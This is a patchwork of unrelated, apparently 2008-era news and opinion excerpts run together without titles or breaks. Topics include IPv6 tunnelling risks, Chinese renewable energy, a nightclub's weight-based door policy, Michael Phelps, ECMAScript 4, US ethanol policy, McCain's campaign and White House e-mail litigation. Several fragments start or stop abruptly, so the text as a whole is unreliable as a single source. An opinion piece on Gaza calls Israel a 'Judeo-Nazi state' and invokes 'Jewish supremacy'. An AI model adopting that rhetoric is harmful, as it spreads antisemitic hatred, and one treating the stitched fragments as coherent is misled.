Networks that currently use bridging technologies such as Teredo or 6to4 that allow IP v4 systems to handle IP v6 traffic are particularly vulnerable , since they 're often configured to work traffic around a firewall , Klein says .
The DoD security specialist agrees .
" Teredo / ISATAP is currently and will continue to be a major red flag for networks that have both IP versions enabled , because tunneling confuses the heck out of a lot of firewalls and IDS deployments , " he says .
" For that reason , organizations absolutely must . . . be very much aware of which systems in their networks are IP v6 enabled .
I do n't personally think most of them have anywhere near a good enough handle on that particular intelligence tidbit . "
Klein has n't checked every firewall product to determine if it 's protecting IP v6 traffic but says older versions of ZoneAlarm and other tools do not support IP v6 , though newer ones do .
Customers should check with vendors to determine if they 're protected .
BEIJING — Winds rush through the capital city of China , blowing dust storms that envelop it in grit from the encroaching Gobi Desert each spring .
Last year , the government finally took advantage of those winds , installing 33 wind turbines manufactured by domestic company Xinjiang Gold Wind at the Guanting wind power field to harvest this energy and use it to supplement the electricity provided by polluting coal .
Those suburban turbines began turning in earnest on January 20 , providing 35 million kilowatt - hours of electricity to Beijing through July , or roughly 300,000 kilowatt - hours a day .
That may supply 20 percent of the power to the city 's Olympic venues , helping the country meet its pledge of a green Olympics .
The government 's commitment to renewable energy is real : the Chinese government recently doubled its target for installed wind power to 10 gigawatts by 2010 after the previous goal of 5 gigawatts was met three years early .
Through 2007 , however , despite abundant winds in Inner Mongolia , Xinjiang , offshore and elsewhere , the country had only slightly more than 6 gigawatts of turbines built , which supplied less than 1 percent — 0.6 percent — of the country 's power .
And even the most optimistic projections have wind power accounting for less than 3 percent of total electricity production by 2020 — more than the current U.S. share of 0.4 percent but far less than world leader , Denmark , which gets roughly 20 percent of its power from the wind .
The U.S. currently gets 7 percent of its energy from renewable resources , of which wind makes up just 5 percent .
In China , the current five - year plan calls for renewables — wind , solar , biogas and hydro power — to account for 10 percent of the country 's energy consumption by 2010 ( up from 7.5 percent in 2005 , the last year of the last five - year plan ) and 15 percent by 2020 .
All to reduce the dependence on — and the pollution from — burning coal .
" Developing and utilizing renewables shall be an important part of building a new socialist countryside , " the plan states , while also calling for the development of 50 entire counties in Jiangsu , Shandong , Guangdon , Guangxi , Sichuan and Inner Mongolia to be built by 2010 that get 50 percent of household energy from renewable sources .
" China is already one of the top renewable energy producers in the world , " says climate and energy campaigner Liu Shuang of environmental group Greenpeace .
" Renewable energy can provide 50 percent of the energy needs in China , " she adds , and the environmental group projects that 37 percent of that renewable energy could come from wind and solar power alone .
But the reality is that , like the wind , renewable power in China is a fickle source .
There are 158 wind farms in China , according to the Chinese Wind Energy Association ( CWEA ) , and the National Development and Reform Commission ( NDRC ) — the government ministry charged with economic development — has called for the installation of 10 gigawatts — up from 6 gigawatts at present — by 2010 .
Major companies — electricity giant Huaneng Group and state - directed China National Offshore Oil Corporation ( CNOOC ) — have responded to the government 's goals , looking to build utility - scale wind farms throughout the country , according to engineer He Dexin , president of CWEA .
" All the good wind farm locations are now owned by the biggest energy companies , " says Greenpeace spokeswoman Sarah Liang .
But even all those good locations will not be enough .
" Because land is very precious in China , some places will not be allowed to build wind farms , " notes Dexin , who has been involved in wind power since the 1970s .
Offshore wind farms may fill the gaps , providing up to 750 gigawatts of electricity , according to the China Meteorology Research Institute , without impacting farms or other sensitive lands .
" China has the largest wind resources in the world and three - quarters of them are offshore , " says Barbara Finamore , director of the Natural Resources Defense Council 's Beijing office .
Typhoons wreaked havoc on poorly designed wind farms in the south of the country in recent years , however , and that does not bode well for China 's ability to build in deep waters .
" The reality in China is they develop [ wind farms ] too fast , " says CWEA 's Cai Fengbo .
" The quality of wind generation suffered . "
Regardless , China remains among the world leaders in building wind turbines , or at least their components .
Even when foreign companies such as General Electric or Suzlon supply the turbines as much as 70 percent of the components are made in China , everything except for bearings and electrical controls .
China is also the number one producer of solar photovoltaics , with more than 200 manufacturers creating 1700 megawatts of the panels in 2007 , says the Chinese Renewable Energy Industries Association ( CREIA ) , or nearly half of the world 's total production of 3,800 megawatts .
Almost none of that remained in the country , however .
" 99 percent goes outside , " says CREIA secretary general Li Junfeng .
" The local market is very limited because [ PV ] is too expensive . "
Around 80 megawatts of solar photovoltaics are used in the country , cropping up on light poles in cities like Rizhao in Shandong province or even the roofs of office buildings that hold solar technology companies , like Beijing Solar Energy Research Institute 's headquarters in the capital city .
And China has become the world 's leading proponent of solar heating technology , which provides hot water everywhere from Beijing airport 's new Terminal 3 to a village inn in Yunnan Province , because it is as cheap as the alternatives .
Still , says Greenpeace 's Liu , " It 's a waste of all the production in China .
It does n't make sense . "
And all of that production means that China is bearing the burden of the pollution that can go along with the manufacture of such renewable energy for other countries — whether the acid rain–forming sulfur dioxide emitted from making the steel in a wind turbine 's blade or the noxious chemicals left over after manufacturing specialized silicon , or glass , that can turn sunshine into electricity .
" To stop global warming , it 's not an excuse to destroy the local environment , " says Greenpeace 's Liu .
" Producing photovoltaics must have strong controls on chemicals . "
So that leaves dams as the cleanest , cheapest option for electricity generation in China .
And the country is blessed with abundant resources in that area : 400 million kilowatts of potential of which only 110 million kilowatts have been developed , according to government figures .
" Within 30 to 50 years , hydro will be the main energy we should rely on , " predicts Lai Hun Suen , a professor of sustainable development at Chongqing University and a municipal government official .
Dams accounted for 16 percent of total electricity generation in 2005 , thanks to the completion of Da Chao Shan , Gong Bo Xia and Three Gorges dams .
But it is a technology that has proven problematic in developed and developing countries — witness the ecological problems brought on by the Three Gorges — and most of the undeveloped locations for hydropower are located in the west of the country while the majority of electricity use is in the east .
Nevertheless , " China will try to rely on hydropower , " Lai says .
" It is a choice we made when we had no other choice . "

A group of girls hoping to enjoy a fun night out were refused entry to a club - for being too fat .
Police were called to calm the situation after they say the manager told them to " go away and lose some weight " .
Georgina Mason , 23 , who was among the group , was left feeling " disgusted " by the ban .
She said : " About five or six or us got there about 11.30 pm on Saturday and the bouncers said we were not allowed in because we were too big .
" I told them not to be ridiculous and asked to speak to the manager .
He would not look at me directly but said they 'd received too many complaints about fat people .
He told me to ' go and lose some weight before you come in - fat people are bad for business ' .
" I was disgusted he had the nerve to say this .
My friend , who is only a size 14 , was not allowed in either . "
Helen Warner witnessed the storm outside the Havana Club in St Helier , Jersey .
Helen , who says she will never set foot in the club again , said : " I heard the manager say ' Go away and lose some weight , love ' .
I can't believe what happened . "
Altogether , 20 women have complained to police and a Facebook protest page has been set up .
But yesterday manager Martin Sayers defended his controversial decision .
He said : " We got a lot of people that I 'd classify as morbidly obese and we were getting complaints .
" I am deeply apologetic but business is not good at the minute and I was trying to protect my business .
" If this highlights the problem of obesity , then perhaps some good has come of this .
" I am overweight myself .
I did not do this to hurt anyone . "
It looks like Apple has fixed Rush Limbaugh ’s Mac issues and he talked about it on the most listened to radio talk show in America ; heard on over 600 stations in the U.S .
Selected excerpts from the transcript of today ’s edition of The Rush Limbaugh Show :
Last time I was in New York or maybe two times ago , I asked on air , an open - air plea to Steve Jobs , the CEO of Apple , Inc. , to help out with a couple problems I was having with the new operating system : OS 10.5 Leopard .
Let me review the problems because it was funny .
You know , every time I talk about Apple … I read a lot of Apple Web blogs just to keep up with the latest what ’s happening with Macs and iPhones and so forth .
Any time I talk about Apple it ’s just guaranteed that some of these blogs are going to blow gaskets like everybody else does .
They ’re mad that I use a Mac , thinking I do n’t know what I ’m talking about when I discuss Mac issues and so forth .
It ’s funny to read .
As I mentioned there were two things that would really be helpful .
Actually , just only one .
The other one was more of a fun thing I wish the computer would do that it was supposed to do .
Both have been resolved through the diligent work of an engineer that Apple assigned my IT guy , and the primary problem was with their Time Machine program .
MacDailyNews Note : Limbaugh mentions that he has four brand - new Mac Pros , each with 32 gigs of RAM with two 3.2GHz Quad - Core Intel Xeon ( 8 - core ) processors , and describes what his Mac issues were ( Time Machine could not restore mailboxes and Back to My Mac could only connect using direct IP sharing ) and what Apple did to fix them .
And , for the record , we are not mad that Rush Limbaugh is a Mac user ( although based on past Limbaugh - related articles , some of our readers certainly do seem to have an issue with Rush ’s choice of platforms ) , nor do we think that he does n’t know what he ’s talking about when he discusses Mac issues .
Selected excerpts ( continued ) :
An Apple engineer was assigned to us , and the fix took place last night .
I did two weeks of trying it , creating logs for the Apple engineers to look at , and they found the problem …
So I just wanted to take a moment to thank people at Apple .
I ’m not going to mention the name of the engineer .
I would love to , but if I did , this guy would be taking heat for the rest of his career from people for helping me .
But they were very cooperative , and I think it ’s going to end up having to be a system - wide fix , which is good , because it ’s been discovered …
What ?
( interruption ) Mmm-hmm .
Algore is not going to fire anybody .
Algore is probably going to say , “ Wow , I can use mail now with Time Machine ? ”
He ’ll probably go home and try it and see if it works .
I do n’t even know …
Somebody said , “ Make ’em name the patch after you . ”
There will be a patch .
I do n’t think they ’ll say anything about it other than in the release notes of the next security update or system update .
But , anyway , I wanted to fill you in on the details of this , because it was very nice [ of ] them and they were extremely dilligent .
It took a lot of time to find out what the glitch was .

Swim demon Michael Phelps won his 8th gold medal of the 2008 Olympics last night , his 14th overall .
How does he do it ?
It 's that crazy 6 ' 4 " bod of his !
" Generally , a man 's arm span equals his height but in his case it 's 6 ' 7 " - three inches more than his height .
Naturally his arms work as powerful propulsive paddles , giving him a clear edge over others .
His lower body , interestingly , is shorter than that of an average man of his height .
His relatively short legs result in less drag or resistance .
In short , Phelps has an upper body of a 6 ' 8 " person but his lower body seems to be of someone who is only 5 ' 10 " , which also make the perfect plane in water . "
More science after the jump .
His size 14 feet may not dwarf Ian Thrope 's size 17 but Phelps ' double - jointed ankles allow him to do a ballerina 's ' pointe ' standing on the tips of the toes .
It allows him to whip his feet as if those are flippers and break loose .
His unique constitution also produces less lactic acid than others which means Phelps takes less time to recover .
And if he looks indefatigable at times , it 's because of the Attention Deficit Hyperactivity Disorder , which he was diagnosed with at the tender age of nine .
His daily routine is equally mindboggling .
He consumes 12,000 calorie every day and trains 96 km every week .
Naturally it was hardly surprising when Russian swimmer Alexander Sukhorukov went on to describe Phelps as " just a normal person , from a different planet , a planet from a different galaxy . "

It 's no secret that director Kevin Smith has been having a rough time in getting an R - rating for his new comedy .
Last month star Seth Rogen went on the record and said the MPAA was giving them trouble with some of the sex stuff in the film .
Well now it ’s not just rumoring , has been officially hit with the NC - 17 kiss of death .
It was the guys at Kevin ’s own site NewsAskew who first uncovered it .
A search on the MPPA ’s official site listsas “ Rating : NC - 17 ” .
Reason for the rating ?
As expected , “ Rated NC - 17 for some graphic sexuality . ”
Gee , thanks MPAA .
As if we could n’t figure that out from the title .
I ’m sure people everywhere were planning to take their kids .
Though I think we ’d all rather see the NC - 17 cut and watch the movie as its director originally intended it to be seen , slapping any movie with an NC - 17 spells box office doom .
Not because people wo n’t show up to see it , but because most major theaters will refuse to carry it , thus taking away our right to choose whether or not we want it in front of our eyes .
The really frustrating thing in this particular case is that if any filmmaker has the kind of audience necessary to blow up the stigma attached to an NC - 17 , it ’s Kevin Smith .
Heck , an NC - 17 rating might even help his ticket sales … his crowd is going to be there money in hand regardless .
Sadly if it ’s not playing , they ’re powerless to support it .
Do n’t worry though , the fight ’s not over for Kevin Smith’s .
Under the movie ’s rating on the MPAA site , there ’s a little note which reads : “ Pending Appeal ” .
That means they ’re fighting the rating , and there ’s still reason to think this thing will eventually get the R it needs to show up in a theater near you .
Of course who knows what sort of cuts Kevin will have to make to his film in order to achieve that .
When the MPAA gets involved with what you ’ll be allowed to see , there ’s always a depressing chance that one of the casualties of their interference could be the movie ’s funniest scene .
I guess there ’s always DVD .
Adobe Systems appears to have been wrong footed and Microsoft left crowing on JavaScript ’s evolution , following a decision by the ECMA .
After several months of wrangling , ECMA technical committee ( TC ) 39 - responsible for JavaScript standardization - has agreed to abandon plans for an ambitious new standard dubbed ECMAScript ( ES ) 4 and concentrate on evolving the current standard ES 3.1 under the new name ES Harmony .
The move is seen by some as a blow to Adobe , which had based ActionScript - the language that underpins its Flash platform - on ES4 .
The conflict within TC 39 spilled into the public domain in October 2007 when Microsoft 's Internet Explorer platform architect Chris Wilson criticized ES 4 for trying to introduce too many changes .
Wilson 's criticism was strongly countered by Mozilla chief architect Brendan Eich , a senior member of TC 39 .
Eich accused Wilson of " spreading falsehoods " about ES 4 and playing political games because Microsoft saw ES 4 as " a competitive threat " .
He also noted that Microsoft has neglected to upgrade its JavaScript compliance in Internet Explorer until it had to .
While Microsoft congratulates itself over its apparent victory , Adobe is putting on a brave face .
In response to questions over the future of ActionScript , Adobe community expert Dan Smith indicated ( see comments ) that it would track the new ES Harmony specifications .
But he also said that key features from ES4 that have now been abandoned will remain .
These include namespaces , packages and classes .
Adobe does not appear to be against cutting back on ES 4 features in principle .
Lars Hansen , Adobe 's representative on TC 39 , proposed cutting back on ES 4 features back in February 2008 . ®

Explanation : How did the star Eta Carinae create this unusual nebula ?
No one knows for sure .
About 165 years ago , the southern star Eta Carinae mysteriously became the second brightest star in the night sky .
In 20 years , after ejecting more mass than our Sun , Eta Car unexpectedly faded .
This outburst appears to have created the Homunculus Nebula , pictured above in a composite image from the Hubble Space Telescope taken last decade .
Visible in the above image center is purple - tinted light reflected from the violent star Eta Carinae itself .
Surrounding this star are expanding lobes of gas laced with filaments of dark dust .
Jets bisect the lobes emanating from the central star .
Surrounding these lobes are red - tinted debris captured only by its glow in a narrow band of red light .
This debris is expanding most quickly of all , and includes streaming whiskers and bow shocks caused by collisions with previously existing material .
Eta Car still undergoes unexpected outbursts , and its high mass and volatility make it a candidate to explode in a spectacular supernova sometime in the next few million years .
wow it is sort of sad how much people actually think it is the state .
and anyways , if that was the case , it wouldnt be " georgia vs. russia " it would be the US vs. russia .
The moment of truth is at hand for US biofuels this week as environmental regulators prepare to rule on one state 's request to halve the steep national target for blending ethanol into fuel .
Texas governor Rick Perry asked the US environmental protection agency ( EPA ) in April to cut the national biofuels target 50 % from its current level of 9bn gallons .
After an unexpected delay last month , the EPA is expected to rule on Perry 's waiver request as soon as this week .
The waiver proposal has stoked a fierce political row over the future of biofuels , with some US politicians echoing their European counterparts in questioning whether ethanol 's effect on food prices limits its usefulness as an alternative to traditional fuel .
" We need to put an end to flawed government policies that distort the markets , raise food prices artificially , and pit producers against consumers , " senator John McCain said in May after he and 23 fellow Republicans endorsed an easing of the ethanol target .
Three major environmental groups have even sided with the conservative governor – albeit with different motives than Perry , who sought the waiver to protect Texas livestock producers from rising corn prices .
Suspending the biofuels target would allow the EPA the environmental sustainability of increased ethanol production , according to Friends of the Earth energy policy campaigner Kate McMahon .
" This biofuels mandate essentially dictates inaction on climate change by taking us in a useless and potentially harmful direction , " McMahon said in a statement last month .
Yet powerful supporters of increased ethanol production hail from nearly every corn-producing state in the US , including an Illinois senator named Barack Obama .
In his energy plan released this week , the Democratic presidential nominee sets a 60 bn - gallon target within 22 years for advanced biofuels , including cellulosic ethanol .
The ethanol industry 's US trade group , the Renewable Fuels Association ( RFA ) , asserts that the carbon footprint of ethanol – already lower than that of conventional petrol – will only decrease as the ethanol target encourages the development of advanced biofuel .
" We 're doing everything we can , as efficiently as we can , to bring those technologies to the marketplace , " RFA spokesman Matt Hartwig said .
" But if you go in and undermine the foundation of the ethanol industry today , you 'll set back the development of those next - generation technologies . "
That more and more US corn is being diverted to make ethanol is not in dispute .
The US agriculture department estimates that 25 % of the nation 's corn crop , valued at $ 52.1bn , was used for fuel last year .
That number could rise as high as 35 % this year .
But the ethanol industry argues that high oil prices , not biofuels , are to blame for food prices that have risen far faster than inflation .
Only one - quarter of recent US corn price increases are attributable to the ethanol tax credit – recently reduced by Congress from 51 cents to 45 cents per gallon – according to a Purdue University study commissioned by the Farm Foundation .
A confidential World Bank report obtained by the Guardian last month , however , tagged biofuels as the cause of a 75 % rise in worldwide food prices .
The EPA 's delay in ruling on the Texas waiver request , which sparked more than 15,000 public comments to the agency , raised concerns among those on both sides of the biofuels battle .
Eight senators from corn-producing states publicly warned EPA administrator Stephen Johnson against " any agreements being made behind closed doors " .
Meanwhile , some commodity watchers predicted that falling corn prices this summer would give the agency grounds to deny the waiver .
No matter what the EPA decides in coming days , the battle may not end right away .
Biofuels supporters are likely to challenge any potential waiver in court , and Perry appears to have laid the groundwork for a lawsuit against the agency if his request is denied .

McCain refuses one - term pledge , says no need to differentiate himself from Bush Nick Juliano

While the White House 's current resident is perhaps the biggest obstacle to Republican John McCain 's hopes to replace him , the GOP 's presidential nominee says he feels no need to demonstrate a clear break from George W. Bush .
" I dont have any need to show that I m different than President Bush , " McCain told Politico 's Mike Allen and Jonathan Martin Wednesday .
In a half - hour exclusive interview with the Politico reporters , McCain went on to offer assurances that if elected he would work more closely with a Democratic Congress than the current president has and seek consensus with political opponents .
The offerings sounded familiar to the " uniter not divider " rhetoric Bush offered on the campaign trail in 2000 and abandoned soon after taking office .
 First thing Id do [ as president ] is to go to see the Speaker of the House and the Majority Leader of the Senate  I assume that that would be Sen .
Reid , I hope not , but I think that s probably the reality of this election  and I would say lets have an agenda , lets work together , we know what the solutions are and we know what the options are  Social Security , on restraining spending , on Medicare , on all of these , energy independence , on all of these issues ,  McCain said when asked how his approach to governance and politics would differ from Bush .
[...]
McCain added :  Im not being elected dictator 
Im being elected president .
And you have to work with Congress .
And they know the priorities as well as I do . 
That last lament from McCain echoed a similar sentiment expressed by then - Gov .
Bush after his first meeting with Congress following the Supreme Court 's decision to end the Florida re-count in 2000 , assuring him the presidency .
" If this were a dictatorship , it'd be a heck of a lot easier , just so long as I'm the dictator , " Bush said after telling Congressional leaders he would stick to his campaign trail pledges such as his proposal to cut taxes .
McCain , who opposed the Bush tax cuts when they first were introduced , has since said he would seek to make them permanent .
He 's moved toward Bush in myriad other ways as well , says blogger Matthew Yglesias .
Look , sure , McCain is nt under any moral obligation to demonstrate difference from President Bush .
But if he intends to pursue substantially the same policies as President Bush , then he has no right to react angrily when his political opponents say hell pursue substantially the same policies as President Bush .
But he does react angrily .
But if hes going to be indignant about the idea that hell pursue Bush - like policies , then he should be able to name some policy areas in which he intends to pursue substantially different policies .
But Ive been listening to what McCain says about taxes , about Social Security , about health care , about drilling , about Iraq , etc. and I dont see many areas in which he intends to follow a dramatically different course .
And he cant name any such areas either .
In his interview with Politico , Wednesday , McCain also flatly said he was " not considering " a one - term pledge that some have suggested would ease voters ' concern over his age .
There has been speculation that McCain , 71 , could couple a single term promise with a untraditional running mate such as Democrat - turned - Independent Sen .
Joseph Lieberman to make the case that he would shove political interests aside and run a consensus - oriented government with the Democratic - held Congress .
Lieberman is slated to speak on the first night of the Republican National Convention next month , and observers see little prospect that McCain would name the Connecticut senator as his running mate .
McCain has said he will announce his vice presidential nominee on Aug. 29 , his 72nd birthday .
For Immediate Release :
July 29 , 2008 Magistrate Judge Affirms Recommendation that Court Order White House to Preserve E-mails on Workstations and Portable Media Concludes Some Missing E-mail May Not Be Preserved on Back - Up Tapes

Washington D.C. , July 29 , 2008 - Magistrate Judge John M. Facciola of the U.S. District Court today denied a motion by the White House to reconsider his earlier recommendations and reaffirmed his recommendation that the court order the Executive Office of the President ( EOP ) to search individual workstations used between March 2003 and October 2005 and preserve any e-mails located on those workstations or on portable media used by EOP employees .
In finding that the White House must search and preserve e-mails saved on individual workstations , the magistrate judge ’s report recognizes that some e-mails sent or received between March 1 , 2003 , and May 22 , 2003 , may not be preserved on existing back - up tapes .
In making that finding , he rejected the EOP ’s assertions that “ substantially all ” such e-mails have been saved on those tapes .
The magistrate judge declined to order EOP to make forensic copies of workstations that may contain relevant e-mails , however , in light of the fact that the passage of time makes it unlikely that relevant data will still be recoverable from the “ slack space ” on the workstations .
Magistrate Judge Facciola also determined there was no need for expedited discovery at this juncture because the court ’s inquiries already have revealed that “ there likely are e-mails not currently being preserved on back - up tapes ” and additional information has been made available through ongoing congressional inquiries .
“ We are pleased that despite the White House 's plea for reconsideration , the Magistrate Judge stood his ground and recommended that the White House be ordered to locate and preserve emails that may be missing from backup tapes but were saved on individual workstations and portable media devices , ” commented Sheila Shadmand , counsel for the Archive .
“ Each of the Judge 's recent rulings in our favor has brought us one step closer to ensuring that the documentary history of this Administration is not forever lost . ”
The National Security Archive originally filed its case against the Executive Office of the President and the National Archives and Records Administration to preserve and restore missing e-mail federal records in September 5 , 2007 .
A subsequent lawsuit filed by Citizens for Responsibility and Ethics in Washington has been consolidated with the Archive 's lawsuit .
A chronology of the litigation is available here .
These sites may provide additional details on the list of known Mersenne Prime Numbers :
Despite babbling about “ staying the course ” and “ keeping the process going , ” Condoleezza Rice ’s latest visit to Israel / occupied Palestine was a belated tacit acknowledgement of the failure of the Bush administration ’s approach toward the Palestinian issue .
Indeed , despite numerous visits to West Jerusalem and Ramallah , which cost American taxpayers millions of dollars , it can be said without exaggeration that Rice ’s achievements amounted to a fat zero .
Rice had wanted to achieve her boss ’s vision of seeing two states in historical Palestine , Israel and a vaguely - defined Palestinian entity , living side by side in peace .
However , after nearly eight years of hectic diplomacy , unfulfilled promises and unrealized hopes , that goal is now as illusive as ever .
In fact , one would n’t evade the truth by saying that the prospect of creating a truly viable Palestinian state in the West Bank is now more unrealistic than it was when Bush came to the White House nearly eight years ago .
The intensive proliferation of Jewish colonies in the occupied territories of 1967 has simply rendered the creation of a Palestinian state worthy of the name unachievable .
We should n’t pay attention to those who say otherwise .
They simply do n’t know what they are talking about , assuming they are sincerely ignorant .
While speaking during a joint press conference with her Israeli counterpart , Tzipi Livni , Rice hardly touched on the continued expansion of Jewish colonies .
She only managed to utter invoke the old platitudinous formula that we have been hearing ad nauseam , namely that “ unilateral acts ” ( notice she would n’t even say the word “ settlements ” ) do n’t help the peace process .
Well , Rice and her boss have been saying the same tired words for ages while Israel keeps stealing Arab land and building Jewish settlements unabated ?
So how are we supposed to interpret this farce or game of make believe ?
Is there a tacit understanding between the U.S. and Israel whereby the former keeps repeating certain disingenuous statements , which only ostensibly criticize Jewish settlement expansion in the West Bank , while the latter keeps building the settlements irrespective of what American officials say in this regard ?
A few years ago , George Bush lambasted the construction of that wall of shame , mutilating Palestinian land and meandering through Palestinian population centers , reducing them to de facto detention camps .
However , Israeli leaders effectively ignored Bush ’s remarks , knowing too well that he was in no position to act on these remarks .
So why would Israel take seriously an administration that says openly that it would n’t punish Israel no matter what it did and that it would never force Israel to do anything against its will ?
Apart from the phenomenal settlement expansion being frantically pursued by the fascist Zionist regime , Rice must have drawn satisfaction from the continuing criminal siege imposed on 1.5 million helpless Palestinians in Gaza .
The manifestly callous lady would n’t even utter a word about the enduring plight of these tormented men , women and children who are made to suffer and die because they had the audacity to elect a political party Israel and the Bush administration did n’t like .
There is no doubt that the American - Western approach to the Gaza ordeal is a stigma of shame at the forehead of the western world .
After all , we are talking about a nefarious collusion between Israel , a Judeo - Nazi state that thinks and behaves and acts like a Nazi state , and western governments in effecting a slow - motion genocide against innocent people for purely political reasons .
Israel used to tell the world that the evil blockade of Gaza was a defensive measure aimed at forcing the Palestinians to stop firing home - made projectiles on nearby Israeli settlements .
However , when a ceasefire was eventually reached more than two months ago , Israel kept the blockade virtually intact and both Israel and Egypt , apparently with American approval , kept the Rafah border crossing , Gaza ’s sole conduit to the outside world , closed .
In truth , Gaza , thanks to this criminal lingering siege , is more than just “ the greatest open - air prison in the world ” as is bruited abroad .
Gaza is actually a real concentration camp , a concentration camp where people are starved , tormented and made to suffer and die for diabolical political calculations having to do with efforts to expedite global American hegemony and Jewish supremacy .
At the Palestinian camp , there is a clearly stupid Palestinian leadership whose main preoccupation is staying politically alive even if this happens to be at the expense of the Palestinian people and their enduring just cause .
This is why the self - proclaimed “ legitimate ” leadership is willing to indulge in endless futile negotiations with our tormentors while Israel keeps stealing our land , demolishing our homes and building settlements for would - be Jewish immigrants from around the world .
This is the same leadership that keeps persecuting and repressing its own citizens by arresting them , torturing them and even killing them on Israel ’s behalf .
It is a leadership that is building a huge security apparatus , with American funding and training , not to liberate our land from the criminal claws of Zionism but rather to further savage our struggling people and weaken their ability to regain their freedom .
And now , we are about to enter a new phase of this farcical “ peace ” process where Palestine continues to be crucified and slaughtered while the whole world plays the role of spectator .
With Ehud Olmert about to leave the Israeli political scene soon , and with Bush having only a few months left in the White House , the Palestinian plight , with all its calamitous aspects , will have to wait at least until the next American administration puts its act together , which will take several months .
Hence , it is imperative that patriotic Palestinians find , as soon as possible , a way out of this absurdity .
Maybe we should be seriously thinking of abandoning the entire strategy of Palestinian statehood based on the so - called two - state solution .
This hapless strategy is losing credibility and relevance and becoming a crippling liability undermining our struggle and aspirations for freedom and justice .
The important thing is that we must no longer allow ourselves to be held - hostage to this farcical theatre known as “ the peace process ” which only spells death and destruction to our people and just cause .
Same - sex couples might be able to teach straight couples a thing or two about egalitarian relationships .
And that 's the precise threat to traditional marriage social conservatives are afraid of .
Oh , we liberals love to laugh
at right wingers , mostly evangelical Christians , who claim that same - sex
marriage is an assault on " traditional marriage . "
If a gay
couple down the street gets married , we reasonably ask , does that invalidate
your marriage ?
Are you going to get a divorce in protest ?
These retorts leave our opponents sputtering ,
mostly because they grasp for a lie to cover up for their homophobia ,
and few people can really lie smoothly .
Or they commit the fallacy of tautology , claiming that marriage simply is
between a man and a woman , many of them knowing as they say it how lame
that sounds — after all , everyone but the dumbest among us understands that marriage
is whatever society agrees it is .
However , just because conservatives dance
around why same - sex marriage is a threat to " traditional "
marriage , it does n’t mean they ’re crazy or do n’t have their reasons for opposing it .
Mostly , they know that their reasons wo n’t sit well
with the general public .
Which is why I read with amusement Tara Parker - Pope ’s piece in the New York Times about why same - sex relationships
might be healthier on average than opposite - sex marriages .
The article had a tin ear for what makes opponents of same - sex marriage
fearful .
Conservatives say that gay marriage is a threat to " traditional "
marriage , and this article all but answered , " Oh yes it is and thank God
for it . "
The article was very convincing if you ’re already convinced that
marriage equality , and equitable marriage , are good things .

Controlling and hostile
emotional tactics , like belligerence and domineering , were less common
among gay couples .
Same - sex couples were also
less likely to develop an elevated heartbeat and adrenaline surges during
arguments .
And straight couples were more likely to stay physically
agitated after a conflict .
Sounds good , right ?
But
the reason for lower stress levels goes right back to why same - sex marriage
is indeed a threat to " traditional " marriage [ emphases below are mine ] .
Notably , same - sex relationships ,
whether between men or women , were far more egalitarian than
heterosexual ones …
While the gay and lesbian
couples had about the same rate of conflict as the heterosexual ones ,
they appeared to have more relationship satisfaction , suggesting that
the inequality of opposite - sex relationships can take a toll …
The egalitarian
nature of same - sex relationships appears to spill over into how those
couples resolve conflict .
The Times
article argues that the equality modeled by same - sex relationships could
influence opposite - sex marriages to adopt that kind of equality .
This is exactly the assault on " traditional " marriage that conservatives
are talking about .
In 1998 , the Southern Baptist
Convention made a point of highlighting Ephesians 5:22 - 23 .
Not a random choice , this was a direct reaction to the creeping peril of feminism .
The verse
made it loud and clear that " traditional marriage " is not egalitarian at all ,
but that women should " submit to your husbands as to the Lord . "
Which sounds like sound common sense to the largely male leadership
of the fundamentalist movement .
And now those yappity - yap decadent
liberals are telling us that not only should same - sex marriage be legal ,
but that it might actually teach straight couples a thing or two .
Opposite - sex couples can learn how
to relate more equitably , and equal marriages are happier .
Happier , pray tell ,
for whom ?
Not for the men who would suddenly be living in a world
where dishes do n’t just do themselves and diapers are n’t changed
by magic .
Men who face the prospect of having to give
up being right in every conflict , having to take the
wife ’s opinion on finances seriously , or even of having their right
to name their wives after themselves called into question might dispute
the idea that they ’d be " happier " in this new egalitarian world .
Like the husband
in this scenario :
Can you explain just how
submissive a wife should be towards a husband without losing her identity
and respect ?…..
Today the kids were eating
a hamburger in the car , and they were looking for a drink .
My husband
says to the kids , " Grab your bottle of water " ( they keep a
bottle in the car at all times ) .
Well , I remembered I had a can of soda
in my purse , so I gave it to them , and he says I undermined his authority !
I did n’t think it was a big deal , but he did .
Do you think that guy is going
to read an article in the Times telling him gay marriage is good because
it might provide a model of equality for his own marriage ?
I suspect this man reading it will only be reassured that gays should not
get married , if they ’re going to give his wife ideas about how she
has equal authority in their marriage .
The Times article does n’t
hide the fact that it ’s straight women who suffer from inequality
in opposite - sex marriage .
" Heterosexual married
women live with a lot of anger about having to do the tasks not only
in the house but in the relationship , " said Esther D. Rothblum , a
professor of women ’s studies at San Diego State University .
" That ’s
very different than what same - sex couples and heterosexual men live
with . "
But fundamentalists would probably
argue that the solution is n’t to change marriage so women are happier
in it ( because remember the threat of men with dishpan hands ) , but to
change women so they are happier being second class .
Like this article :
Pray each morning that God
will guide you and give you a servant ’s heart .
Do those with a servant ’s
heart demand that their masters share the housework with them ?
Not if they want to keep their jobs , they do n’t .
The New York Times article read like
it was trying to soothe opponents of same - sex marriage by telling them
that their fears of a spreading contagion were ill - founded and that
same - sex marriages might actually be a model for more happiness through
equality .
But what if your opponents think that equality is the
very contagion from which they have to protect their own marriages ?

Mirroring PyPI becomes a recurrent need for Zope development , because zc.buildout makes a lot of package downloads to build one application .
This is useful when you are working in an intranet with limited web access or when you want to speed up download times .
It also makes things safer : if PyPI is down and if developers computers do n’t have caches , having a mirror will save your day .
While PyPI has proven its robustness ( it is 100 % up for months now as far as I can see ) , having mirrors makes a lot of sense .
We have created a small mirror application here at Ingeniweb , that we use for our buildouts needs .
This work was thaught and created by my colleague Bertrand Mathieu .
It is a smart proxy that will download packages at PyPI everytime they have been asked by a buildout or an easy_install client .
When the package is downloaded , it is kept in the proxy side for any new requests .
This means that after a while , the proxy has its own collection of packages that corresponds to the real needs and will not query PyPI anymore .
This approach avoids having to download and synchronize PyPI with crons , which is a heavy process since PyPI weight several gigas .
The caveat of course , is that it wo n’t be able to get a new package if PyPI is down .
Take a look !

The survey showed that a majority agreed with the false statement that since the Second World War the US had more often sided with non-Muslims when they had come into conflict with Muslims .
In fact in 11 out of 12 major conflicts between Muslims and non-Muslims , Muslims and secular forces , or Arabs and non-Arabs , the US has sided with the former group .
Those conflicts included Turkey and Greece , Bosnia and Yugoslavia , and and Kosovo and Yugoslavia .

